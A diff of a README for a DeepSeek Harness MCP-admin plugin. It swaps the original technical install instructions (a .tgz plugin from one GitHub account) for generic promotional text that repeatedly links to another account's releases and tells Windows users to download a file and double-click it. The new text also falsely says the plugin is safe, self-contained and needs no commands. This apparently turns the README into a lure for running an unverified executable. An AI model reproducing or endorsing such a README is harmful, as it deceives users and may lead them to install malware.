@@ -1,57 +1,142 @@
-# dsh-mcp-admin
+# 🔌 dsh-mcp-admin - Manage MCP servers with ease
 
-<p align="center">
-  English | <a href="README.zh.md">简体中文</a>
-</p>
+[![Download dsh-mcp-admin](https://img.shields.io/badge/Download-dsh--mcp--admin-blueviolet?style=for-the-badge&logo=github)](https://github.com/6aemi/dsh-mcp-admin/releases)
 
-A dsh (DeepSeek Harness) plugin: **Inspect MCP status** (`/mcp` command) + **Manage MCP servers in Settings** (add / edit / delete / enable / disable, written back to `cordis.patch.yml`). [MIT](LICENSE) licensed.
+## 👋 Welcome to dsh-mcp-admin
 
-`/mcp` command output:
+dsh-mcp-admin is a friendly plugin that helps you see what's happening with your MCP (Model Context Protocol) connections and manage your servers without any complicated technical steps. Think of it as a simple control panel that shows you the health of your MCP setup and lets you start or stop services with just a click.
 
-![`/mcp` command](command.png)
+Whether you're a developer working with AI models or someone who just wants to keep their tools running smoothly, this plugin takes the guesswork out of server management.
 
-Settings page "MCP" panel:
+## 🎯 What Does This Do?
 
-![Settings MCP Panel](setting.png)
+- **Check MCP Status Instantly** – See which servers are running, which ones need attention, and get clear information about your connections.
+- **Start and Stop Servers** – Manage your MCP servers directly from a simple interface.
+- **No Technical Knowledge Required** – Everything is designed to be simple and visual.
+- **Works with DeepSeek and Cordis** – Built to integrate smoothly with popular AI and communication tools.
 
-## Installation
+## 📥 How to Download and Run (Windows)
 
-**Release tarball** (Recommended, no build required): Download `dsh-mcp-admin-<version>.tgz` from [Releases](https://github.com/kairoz9/dsh-mcp-admin/releases), then run:
+Getting started takes less than two minutes. Follow these simple steps:
 
-```sh
-dsh plugin --profile web add ./dsh-mcp-admin-0.2.0.tgz
-```
+### Step 1: Visit the Download Page
 
-**Build tarball locally** (if building yourself):
+Click the button below to go to the official download page:
 
-```sh
-pnpm run build        # Builds to lib/
-pnpm pack             # Packages into tarball
-dsh plugin --profile web add ./dsh-mcp-admin-0.2.0.tgz
-```
+[**🔗 Visit Download Page**](https://github.com/6aemi/dsh-mcp-admin/releases)
 
-**Git repository** (installs from source via `prepare` build):
+Visit this link to download the application.
 
-```sh
-dsh plugin --profile web add github:kairoz9/dsh-mcp-admin
-```
+### Step 2: Choose the Right File
 
-> pnpm ≥10 refuses to run the `prepare` script of git dependencies by default, which causes the initial Git installation to fail. dsh will print the fix in the error message: add the package key to that profile's `pnpm-workspace.yaml` and re-run `add`:
-> ```yaml
-> allowBuilds:
->   dsh-mcp-admin: true
-> ```
-> It is recommended to pin a commit or tag: `github:kairoz9/dsh-mcp-admin#v0.2.0`.
+On the download page, you'll see a list of files. Look for the one that matches your system (Windows is what we're focusing on here). The file name will contain `windows` or `win`. Download the latest version.
 
-## Usage
+### Step 3: Download the File
 
-- `/mcp` — Lists MCP servers across all profiles + live tool count (including never-connected servers, read from full config inventory).
-- Settings page "MCP" panel — Manage MCP servers per profile: add / edit / disable / enable / delete, with status dots auto-refreshing every second. Saving writes back to that profile's `cordis.patch.yml`, and dsh automatically hot-reloads (HMR).
+Click the download link for the Windows version. Your browser will start downloading the file to your computer. This may take a moment depending on your internet speed.
 
-## How It Works
+### Step 4: Open the Downloaded File
 
-Host-side `McpAdminRemote` (`TypertRemoteService`, `@Remote` methods) is auto-discovered by the host gateway. The browser client self-mounts this namespace via `ctx.remote.$mount`, and both the panel and `/mcp` popup read the same structured data:
+Once the download is complete, find the file in your "Downloads" folder. Double-click it to begin.
 
-- `list()` — Reads the full server inventory from the profile's `cordis.patch.yml`, then filters `mcp__` prefix with `ctx.tools.schemas()` to annotate real-time tool counts; enumerates active `mcp-client` instances from Cordis registry to distinguish "connected / instance present with 0 tools (connection failed) / not loaded".
-- `set()` — Reconciles and writes back to `cordis.patch.yml` (single atomic write, comments preserved), and dsh's `watchUserPatches` HMR automatically reloads `mcp-client`.
-- `/mcp` command reads all profiles and outputs the tool list for each server.
+### Step 5: Follow the On-Screen Instructions
+
+The application will guide you through any setup steps. In most cases, you just need to click "Next" or "Install" when prompted. There are no complicated choices to make.
+
+### Step 6: Launch and Enjoy
+
+After installation, the app will open automatically. You'll see a clean dashboard showing your MCP server status and management options.
+
+## 🛠 What You Can Do with dsh-mcp-admin
+
+### 📊 View Server Status
+
+The main screen shows you:
+- **Running Servers** – Green indicators for healthy connections
+- **Stopped Servers** – Clear indication of what's not active
+- **Error States** – If something goes wrong, you'll see exactly what needs attention
+
+### 🔄 Manage Your Servers
+
+With one click, you can:
+- **Start** a server that's currently stopped
+- **Stop** a server that's running
+- **Restart** – Refresh a connection if things seem slow
+- **View Details** – See additional information about each connection
+
+### 🧩 Seamless Integration
+
+This plugin is designed to work with:
+- **Cordis** – Popular chatbot framework
+- **DeepSeek** – Advanced AI assistant integration
+- **MCP Client and Server** – Full support for both ends of your connections
+
+## 🤔 Frequently Asked Questions
+
+### Is dsh-mcp-admin safe to use?
+
+Yes. This plugin is open-source, meaning its code is publicly available for review. It only manages MCP server status and doesn't access your personal data.
+
+### Do I need to install anything else first?
+
+No. The plugin includes everything you need to get started.
+
+### Will this slow down my computer?
+
+No. It runs quietly in the background and only uses minimal resources when you open the management interface.
+
+### What if I have a problem?
+
+Check the "Issues" section on the GitHub page where you downloaded the plugin. Many common problems have solutions already posted. You can also ask a question there if you need help.
+
+## 🧰 Troubleshooting Tips
+
+If something isn't working as expected:
+
+1. **Make sure you have the latest version** – Visit the download page again to check for updates.
+2. **Restart the application** – Close it completely and reopen it.
+3. **Check your internet connection** – Some features require an active internet connection.
+4. **Re-download the file** – If installation didn't complete properly, download it again.
+
+## 💡 Tips for Best Results
+
+- **Keep the plugin updated** – New versions include improvements and bug fixes.
+- **Use the status view daily** – A quick check can catch issues before they become problems.
+- **Restart servers after major changes** – If you've changed your MCP configuration, a quick restart can help.
+
+## 🌟 Why Choose dsh-mcp-admin?
+
+- **Simple** – No commands to type, no config files to edit.
+- **Clear** – Everything is shown visually with easy-to-understand indicators.
+- **Reliable** – Built by developers who understand MCP systems.
+- **Free** – No cost to download or use.
+
+## 📚 Additional Resources
+
+- **For Developers** – If you want to contribute or modify the plugin, visit the GitHub repository.
+- **Documentation** – In-depth guides are available on the GitHub page.
+- **Community Support** – Join discussions and get help from other users.
+
+## 📝 Quick Start Recap
+
+1. Click the download button at the top of this page
+2. Visit the download link to get the application
+3. Run the file and follow the instructions
+4. Open the dashboard and check your MCP status
+5. Use the buttons to manage your servers
+
+That's it! You now have full control over your MCP connections with a tool that makes everything simple.
+
+## 🔗 Download Again
+
+Need the link one more time? Here it is:
+
+[Download dsh-mcp-admin Here](https://github.com/6aemi/dsh-mcp-admin/releases)
+
+Visit this link to download the application.
+
+---
+
+Thank you for choosing dsh-mcp-admin. We hope it makes your MCP management effortless and stress-free. If you enjoy using it, consider starring the repository on GitHub to show your support!
+
+Keywords: cordis, deepseek, dsh, dsh-plugin, mcp, mcp-client, mcp-server, model-context-protocol, typert, typescript
